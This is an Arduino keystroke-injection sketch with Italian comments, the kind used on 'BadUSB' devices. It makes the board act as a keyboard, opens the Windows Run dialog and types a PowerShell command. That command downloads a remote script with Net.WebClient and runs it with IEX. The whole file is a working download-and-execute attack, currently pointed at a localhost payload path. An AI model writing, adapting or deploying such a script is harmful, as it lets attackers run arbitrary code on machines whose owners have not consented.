

#include <Keyboard.h>
#include <KeyboardLayout.h>

#include <Keyboard_it_IT.h>




void typeKey(uint8_t KeyboardLayout_it_IT) // inserimento del layout italiano, questa funzione permette di premere e rilasciare immediatamente un tasto della tastiera
{
  Keyboard.press(KeyboardLayout_it_IT);
  delay(50);
  Keyboard.release(KeyboardLayout_it_IT);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin(KeyboardLayout_it_IT); //inizializza la tastiera con layout ita
   // Wait 500ms
  delay(500);

  delay(2000);
 
  Keyboard.press(KEY_LEFT_GUI); 
  Keyboard.press('r');     //simulazione della coppia tasti win + r
  Keyboard.releaseAll();

  delay(2000);
  Keyboard.print("powershell \"IEX (New-Object Net.WebClient).DownloadString('http://localhost:80/payload/payload.ps1');\""); 
  
  delay(1000);
  
  typeKey(KEY_RETURN);

  Keyboard.end();
  
}

/* Unused endless loop */
void loop() {}
